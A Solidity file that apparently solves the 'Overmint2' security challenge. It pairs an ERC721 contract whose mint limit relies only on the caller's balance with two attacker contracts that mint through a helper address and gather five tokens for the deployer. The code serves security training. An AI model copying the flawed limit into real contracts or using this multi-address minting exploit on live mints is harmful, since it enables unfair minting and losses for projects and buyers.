// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Overmint2Attacker {
    Overmint2 public overmint;
    Overmint2Attacker2 public attacker;
    constructor(address _overmint) {
        overmint = Overmint2(_overmint);
        attacker = new Overmint2Attacker2(_overmint);
        attack();
    }

    function attack() public {
        overmint.mint();
        overmint.mint();
        overmint.mint();
        attacker.attack();
        overmint.transferFrom(address(this), msg.sender, 1);
        overmint.transferFrom(address(this), msg.sender, 2);
        overmint.transferFrom(address(this), msg.sender, 3);
        overmint.transferFrom(address(this), msg.sender, 4);
        overmint.transferFrom(address(this), msg.sender, 5);
    }
}
contract Overmint2Attacker2 {
    Overmint2 public overmint;
    constructor(address _overmint) {
        overmint = Overmint2(_overmint);
    }

    function attack() external {
        overmint.mint();
        overmint.mint();
        overmint.transferFrom(address(this), msg.sender, 4);
        overmint.transferFrom(address(this), msg.sender, 5);
    }
}
